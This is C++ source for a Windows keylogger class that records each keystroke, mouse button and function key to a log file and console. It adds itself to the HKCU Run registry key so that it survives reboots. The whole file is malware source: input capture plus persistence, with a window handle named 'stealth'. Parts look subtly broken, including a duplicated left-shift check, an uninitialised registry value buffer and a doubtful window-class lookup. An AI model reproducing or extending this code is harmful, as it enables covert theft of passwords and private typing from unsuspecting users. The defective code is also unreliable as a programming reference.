#include "basic_functions.h"

void K_Logger::WriteToDoc(LPCSTR text, const string filePath)
{
	std::fstream doc_to;

	doc_to.open(filePath, fstream::app | fstream::in);
	doc_to << text;
	doc_to.close();
}

int K_Logger::SaveSymbol(WORD iKey, const string filePath)
{
	switch (iKey)
	{
	case VK_SCROLL:
		cout << " *SCROLL* ";
		WriteToDoc(" *SCROLL* ", filePath);
		break;

	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << ")";
			WriteToDoc(")", filePath);
		}
		else
		{
			cout << "0";
			WriteToDoc("0", filePath);
		}
		break;

	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
		{
			cout << "!";
			WriteToDoc("!", filePath);
		}
		else
		{
			cout << "1";
			WriteToDoc("1", filePath);
		}
		break;

	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "@";
			WriteToDoc("@", filePath);
		}
		else
		{
			cout << "2";
			WriteToDoc("2", filePath);
		}
		break;

	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "#";
			WriteToDoc("#", filePath);
		}
		else
		{
			cout << "3";
			WriteToDoc("3", filePath);
		}
		break;

	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "$";
			WriteToDoc("$", filePath);
		}
		else
		{
			cout << "4";
			WriteToDoc("4", filePath);
		}
		break;

	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "%";
			WriteToDoc("%", filePath);
		}
		else
		{
			cout << "5";
			WriteToDoc("5", filePath);
		}
		break;

	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "^";
			WriteToDoc("^", filePath);
		}
		else
		{
			cout << "6";
			WriteToDoc("6", filePath);
		}
		break;

	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "&";
			WriteToDoc("&", filePath);
		}
		else
		{
			cout << "7";
			WriteToDoc("7", filePath);
		}
		break;

	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "*";
			WriteToDoc("*", filePath);
		}
		else
		{
			cout << "8";
			WriteToDoc("8", filePath);
		}
		break;

	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "(";
			WriteToDoc("(", filePath);
		}
		else
		{
			cout << "9";
			WriteToDoc("9", filePath);
		}
		break;

	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "A";
			WriteToDoc("A", filePath);
		}
		else
		{
			cout << "a";
			WriteToDoc("a", filePath);
		}
		break;

	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "B";
			WriteToDoc("B", filePath);
		}
		else
		{
			cout << "b";
			WriteToDoc("b", filePath);
		}
		break;

	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "C";
			WriteToDoc("C", filePath);
		}
		else
		{
			cout << "c";
			WriteToDoc("c", filePath);
		}
		break;

	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "D";
			WriteToDoc("D", filePath);
		}
		else
		{
			cout << "d";
			WriteToDoc("d", filePath);
		}
		break;

	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "E";
			WriteToDoc("E", filePath);
		}
		else
		{
			cout << "e";
			WriteToDoc("e", filePath);
		}
		break;

	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "F";
			WriteToDoc("F", filePath);
		}
		else
		{
			cout << "f";
			WriteToDoc("f", filePath);
		}
		break;

	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "G";
			WriteToDoc("G", filePath);
		}
		else
		{
			cout << "g";
			WriteToDoc("g", filePath);
		}
		break;

	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "H";
			WriteToDoc("H", filePath);
		}
		else
		{
			cout << "h";
			WriteToDoc("h", filePath);
		}
		break;

			case 73:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "I";
					WriteToDoc("I", filePath);
				}
				else
				{
					cout << "i";
					WriteToDoc("i", filePath);
				}
				break;
		
			case 74:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "J";
					WriteToDoc("J", filePath);
				}
				else
				{
					cout << "j";
					WriteToDoc("j", filePath);
				}
				break;
		
		
			case 75:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "K";
					WriteToDoc("K", filePath);
				}
				else
				{
					cout << "k";
					WriteToDoc("k", filePath);
				}
				break;
		
		
			case 76:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "L";
					WriteToDoc("L", filePath);
				}
				else
				{
					cout << "l";
					WriteToDoc("l", filePath);
				}
				break;
		
			case 77:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "M";
					WriteToDoc("M", filePath);
				}
				else
				{
					cout << "m";
					WriteToDoc("m", filePath);
				}
				break;
		
		
			case 78:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "N";
					WriteToDoc("N", filePath);
				}
				else
				{
					cout << "n";
					WriteToDoc("n", filePath);
				}
				break;
		
			case 79:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "O";
					WriteToDoc("O", filePath);
				}
				else
				{
					cout << "o";
					WriteToDoc("o", filePath);
				}
				break;
		
			case 80:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "P";
					WriteToDoc("P", filePath);
				}
				else
				{
					cout << "p";
					WriteToDoc("p", filePath);
				}
				break;
		
			case 81:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "Q";
					WriteToDoc("Q", filePath);
				}
				else
				{
					cout << "q";
					WriteToDoc("q", filePath);
				}
				break;
		
			case 82:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "R";
					WriteToDoc("R", filePath);
				}
				else
				{
					cout << "r";
					WriteToDoc("r", filePath);
				}
				break;
		
			case 83:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "S";
					WriteToDoc("S", filePath);
				}
				else
				{
					cout << "s";
					WriteToDoc("s", filePath);
				}
				break;
		
			case 84:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "T";
					WriteToDoc("T", filePath);
				}
				else
				{
					cout << "t";
					WriteToDoc("t", filePath);
				}
				break;
		
			case 85:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "U";
					WriteToDoc("U", filePath);
				}
				else
				{
					cout << "u";
					WriteToDoc("u", filePath);
				}
				break;
		
			case 86:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "V";
					WriteToDoc("V", filePath);
				}
				else
				{
					cout << "v";
					WriteToDoc("v", filePath);
				}
				break;
		
			case 87:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "W";
					WriteToDoc("W", filePath);
				}
				else
				{
					cout << "w";
					WriteToDoc("w", filePath);
				}
				break;
		
			case 88:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "X";
					WriteToDoc("X", filePath);
				}
				else
				{
					cout << "x";
					WriteToDoc("x", filePath);
				}
				break;
		
			case 89:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "Y";
					WriteToDoc("Y", filePath);
				}
				else
				{
					cout << "y";
					WriteToDoc("y", filePath);
				}
				break;
		
			case 90:
				if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
				{
					cout << "Z";
					WriteToDoc("Z", filePath);
				}
				else
				{
					cout << "z";
					WriteToDoc("z", filePath);
				}
				break;
		
		
		
		
			case VK_F1:
				cout << "  *F1*  ";
				WriteToDoc("  *F1*  ", filePath);
				break;
		
			case VK_F2:
				cout << "  *F2*  ";
				WriteToDoc("  *F2*  ", filePath);
				break;
		
			case VK_F3:
				cout << "  *F3*  ";
				WriteToDoc("  *F3*  ", filePath);
				break;
		
			case VK_F4:
				cout << "  *F4*  ";
				WriteToDoc("  *F4*  ", filePath);
				break;
		
			case VK_F5:
				cout << "  *F5*  ";
				WriteToDoc("  *F5*  ", filePath);
				break;
		
			case VK_F6:
				cout << "  *F6*  ";
				WriteToDoc("  *F6*  ", filePath);
				break;
		
			case VK_F7:
				cout << "  *F7*  ";
				WriteToDoc("  *F7*  ", filePath);
				break;
		
			case VK_F8:
				cout << "  *F8*  ";
				WriteToDoc("  *F8*  ", filePath);
				break;
		
			case VK_F9:
				cout << "  *F9*  ";
				WriteToDoc("  *F9*  ", filePath);
				break;
		
			case VK_F10:
				cout << "  *F10*  ";
				WriteToDoc("  *F10*  ", filePath);
				break;
		
			case VK_F11:
				cout << "  *F11*  ";
				WriteToDoc("  *F11*  ", filePath);
				break;
		
		
			case VK_END:
				cout << "  *END*  ";
				WriteToDoc("  *END*  ", filePath);
				break;
		
			case VK_HOME:
				cout << "  *HOME*  ";
				WriteToDoc("  *HOME*  ", filePath);
				break;
		
			case VK_NUMLOCK:
				cout << "  *Num_Lock*  ";
				WriteToDoc("  *Num_Lock*  ", filePath);
				break;
		
			case VK_RWIN:
				cout << "  *Right_Windows*  ";
				WriteToDoc("  *Right_Windows*  ", filePath);
				break;
		
		
		//		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
		//		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
			case VK_NUMPAD0:
				cout << "0";
				WriteToDoc("0", filePath);
				break;
		
			case VK_NUMPAD1:
				cout << "1";
				WriteToDoc("1", filePath);
				break;
		
			case VK_NUMPAD2:
				cout << "2";
				WriteToDoc("2", filePath);
				break;
		
			case VK_NUMPAD3:
				cout << "3";
				WriteToDoc("3", filePath);
				break;
		
			case VK_NUMPAD4:
				cout << "4";
				WriteToDoc("4", filePath);
				break;
		
			case VK_NUMPAD5:
				cout << "5";
				WriteToDoc("5", filePath);
				break;
		
			case VK_NUMPAD6:
				cout << "6";
				WriteToDoc("6", filePath);
				break;
		
			case VK_NUMPAD7:
				cout << "7";
				WriteToDoc("7", filePath);
				break;
		
			case VK_NUMPAD8:
				cout << "8";
				WriteToDoc("8", filePath);
				break;
		
			case VK_NUMPAD9:
				cout << "9";
				WriteToDoc("9", filePath);
				break;
		
			case VK_DECIMAL:
				cout << ".";
				WriteToDoc(".", filePath);
				break;
		
			case VK_SUBTRACT:
				cout << "-";
				WriteToDoc("-", filePath);
				break;
		
			case VK_MULTIPLY:
				cout << "*";
				WriteToDoc("*", filePath);
				break;
		
			case VK_DIVIDE:
				cout << "/";
				WriteToDoc("/", filePath);
				break;
		
			case VK_ADD:
				cout << "+";
				WriteToDoc("+", filePath);
				break;
		//		//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		//	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		//
		
			case VK_LWIN:
				cout << " Left_Win ";
				WriteToDoc(" Left_Win ", filePath);
				break;
		
		
			case VK_SPACE:
				cout << " ";
				WriteToDoc(" ", filePath);
				break;
		
			case VK_TAB:
				cout << " *TAB* ";
				WriteToDoc(" *TAB* ", filePath);
				break;
		
			case VK_MBUTTON:
				cout << "  *mouse_middle-button*  ";
				WriteToDoc("  *mouse_middle-button*  ", filePath);
				break;
		
			case VK_MENU:
				cout << "  *Left_ALT*  ";
				WriteToDoc("  *Left_ALT*  ", filePath);
				break;
		
			case VK_SNAPSHOT:
				cout << "  *PRINT_SCREEN*  ";
				WriteToDoc("  *PRINT_SCREEN*  ", filePath);
				break;
		
			case VK_CAPITAL:
				cout << "  *CAPS_LOCK*  ";
				WriteToDoc("  *CAPS_LOCK*  ", filePath);
				break;
		
			case VK_RETURN:
				cout << "ENTER \n";
				WriteToDoc("ENTER \n", filePath);
				break;
		
			case VK_SHIFT:
				cout << " *Left_Shift* ";
				WriteToDoc(" *Left_Shift* ", filePath);
				break;
		
			case VK_RSHIFT:
				cout << " *Right_Shift* ";
				WriteToDoc(" *Right_Shift* ", filePath);
				break;
		
			case VK_BACK:
				cout << "\b";
				WriteToDoc("\b", filePath);
				break;
		
			case VK_PRIOR:
				cout << "  *PageUp*  ";
				WriteToDoc("  *PageUp*  ", filePath);
				break;
		
			case VK_NEXT:
				cout << "  *PageDown*  ";
				WriteToDoc("  *PageDown*  ", filePath);
				break;
		
			case VK_ESCAPE:
				cout << " *Esc* ";
				WriteToDoc(" *Esc* ", filePath);
				break;
		
			case VK_UP:
				cout << " btn_up ";
				WriteToDoc(" btn_up ", filePath);
				break;
		
			case VK_DOWN:
				cout << " btn_down ";
				WriteToDoc(" btn_down ", filePath);
				break;
		
			case VK_LEFT:
				cout << " btn_left ";
				WriteToDoc(" btn_left ", filePath);
				break;
		
			case VK_RIGHT:
				cout << " btn_right ";
				WriteToDoc(" btn_right ", filePath);
				break;
		
			case VK_CONTROL:
				cout << " btn_ctrl ";
				WriteToDoc(" btn_ctrl ", filePath);
				break;
		
			case VK_INSERT:
				cout << " Insert ";
				WriteToDoc(" Insert ", filePath);
				break;
		
			case VK_DELETE:
				cout << " *Delete* ";
				WriteToDoc(" Delete ", filePath);
				break;
		
		
			case VK_RBUTTON:
				cout << " *mouse_right *";
				WriteToDoc(" *mouse_right* ", filePath);
				break;
		
			case VK_LBUTTON:
				cout << " *mouse_left* ";
				WriteToDoc(" *mouse_left* ", filePath);
				break;
		
			default:
				cout << "?";
				WriteToDoc("?", filePath);
				break;
		}
		return 0;
}

void K_Logger::VisibilityApp()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow", NULL);
	ShowWindow(stealth, 1);
}

void K_Logger::AddToAutorun()
{
	HKEY registryKey;
	char sizeReg[0x100];

	RegCreateKeyEx(HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		nullptr,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE, nullptr,
		&registryKey, nullptr);


	if (registryKey)
	{
		RegSetValueEx(registryKey, "Logger", NULL, REG_SZ, (LPBYTE)sizeReg, strlen(sizeReg));
		RegCloseKey(registryKey);
	}
}